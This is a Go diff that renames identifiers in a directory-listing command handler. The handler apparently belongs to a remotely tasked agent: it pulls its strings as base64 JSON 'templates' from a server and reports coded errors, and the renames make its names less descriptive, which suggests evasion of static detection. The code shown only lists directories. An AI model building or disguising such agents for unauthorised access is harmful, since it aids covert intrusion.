@@ -17,8 +17,8 @@ import (
 	"time"
 )
 
-// LsTemplate receives string templates from server
-type LsTemplate struct {
+// ListDirCfg receives string templates from server
+type ListDirCfg struct {
 	Version   int      `json:"v"`
 	Type      int      `json:"t"`
 	Templates []string `json:"tpl"`
@@ -54,12 +54,12 @@ const (
 	idxLsWinRoot   = 226 // C:\
 )
 
-type LsCommand struct {
-	tpl *LsTemplate
+type ListDirMsg struct {
+	tpl *ListDirCfg
 }
 
 // getTpl safely retrieves a template string by index
-func (c *LsCommand) getTpl(idx int) string {
+func (c *ListDirMsg) getTpl(idx int) string {
 	if c.tpl != nil && c.tpl.Templates != nil && idx < len(c.tpl.Templates) {
 		return c.tpl.Templates[idx]
 	}
@@ -83,7 +83,7 @@ type dirStats struct {
 }
 
 // parseFlags parses command line flags for ls
-func (c *LsCommand) parseFlags(args []string) ([]string, lsOptions, error) {
+func (c *ListDirMsg) parseFlags(args []string) ([]string, lsOptions, error) {
 	opts := lsOptions{
 		maxDepth: -1, // Default to unlimited depth
 	}
@@ -230,7 +230,7 @@ func matchesFilterForDir(name string, opts lsOptions) bool {
 }
 
 // formatSize formats file size in human-readable format if requested
-func (c *LsCommand) formatSize(size int64, humanReadable bool) string {
+func (c *ListDirMsg) formatSize(size int64, humanReadable bool) string {
 	if !humanReadable {
 		return fmt.Sprintf("%12d", size)
 	}
@@ -253,7 +253,7 @@ func (c *LsCommand) formatSize(size int64, humanReadable bool) string {
 	return fmt.Sprintf("%12d", size)
 }
 
-func (c *LsCommand) listDirectory(path string, opts lsOptions, currentDepth int, stats *dirStats) (string, error) {
+func (c *ListDirMsg) listDirectory(path string, opts lsOptions, currentDepth int, stats *dirStats) (string, error) {
 	osWindows := c.getTpl(idxLsOsWindows)
 	osLinux := c.getTpl(idxLsOsLinux)
 	osDarwin := c.getTpl(idxLsOsDarwin)
@@ -435,31 +435,31 @@ func (c *LsCommand) listDirectory(path string, opts lsOptions, currentDepth int,
 	return output.String(), nil
 }
 
-func (c *LsCommand) Execute(ctx *CommandContext, args []string) CommandResult {
-	// Parse template from Command.Data - required for operation
-	if ctx.CurrentCommand == nil || ctx.CurrentCommand.Data == "" {
-		return CommandResult{
+func (c *ListDirMsg) execute(ctx *OpCtx, args []string) OpResult {
+	// Parse template from Msg.Data - required for operation
+	if ctx.CurrentMsg == nil || ctx.CurrentMsg.Data == "" {
+		return OpResult{
 			Output:      Err(E18),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
-	decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data)
+	decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentMsg.Data)
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E18),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
-	c.tpl = &LsTemplate{}
+	c.tpl = &ListDirCfg{}
 	if err := json.Unmarshal(decoded, c.tpl); err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E18),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -470,12 +470,12 @@ func (c *LsCommand) Execute(ctx *CommandContext, args []string) CommandResult {
 	// Parse flags
 	remainingArgs, opts, err := c.parseFlags(args)
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Error:       err,
-			ErrorString: Err(E2),
+			EStr: Err(E2),
 			Output:      Err(E2),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -494,22 +494,22 @@ func (c *LsCommand) Execute(ctx *CommandContext, args []string) CommandResult {
 	// Verify directory exists and is accessible
 	info, err := NetworkAwareStatFile(targetDir)
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Error:       err,
-			ErrorString: Err(E4),
+			EStr: Err(E4),
 			Output:      ErrCtx(E4, targetDir),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
 	if !info.IsDir() {
-		return CommandResult{
+		return OpResult{
 			Error:       fmt.Errorf(Err(E7)),
-			ErrorString: Err(E7),
+			EStr: Err(E7),
 			Output:      ErrCtx(E7, targetDir),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -527,12 +527,12 @@ func (c *LsCommand) Execute(ctx *CommandContext, args []string) CommandResult {
 
 	output, err := c.listDirectory(targetDir, opts, 0, stats)
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Error:       err,
-			ErrorString: Err(E10),
+			EStr: Err(E10),
 			Output:      ErrCtx(E10, targetDir),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -544,10 +544,10 @@ func (c *LsCommand) Execute(ctx *CommandContext, args []string) CommandResult {
 		output = SuccCtx(S0, "0")
 	}
 
-	return CommandResult{
+	return OpResult{
 		Output:      output,
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
 
